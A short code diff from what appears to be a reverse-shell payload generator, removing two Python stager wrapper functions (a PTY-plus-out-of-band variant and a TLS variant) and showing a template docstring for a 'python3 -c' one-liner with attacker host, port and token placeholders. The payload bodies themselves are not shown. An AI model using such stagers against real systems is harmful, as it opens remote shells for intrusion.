@@ -154,15 +154,6 @@ def python_stager(lhost: str, port: int, token: str) -> str:
     return _stager(lhost, str(port), token, tls=False)
 
 
-def python_stager_v2(lhost: str, port: int, token: str) -> str:
-    """PTY + OOB combined stager. See `_stager_v2`."""
-    return _stager_v2(lhost, str(port), token, tls=False)
-
-
-def python_tls_stager(lhost: str, port: int, token: str) -> str:
-    return _stager(lhost, str(port), token, tls=True)
-
-
 def stager_template(tls: bool, oob: bool = True) -> str:
     """A `python3 -c '...'` one-liner with {LHOST}/{PORT}/{TOKEN} placeholders — the browser
     fetches this and fills it client-side, so there's one source of truth for the payload.
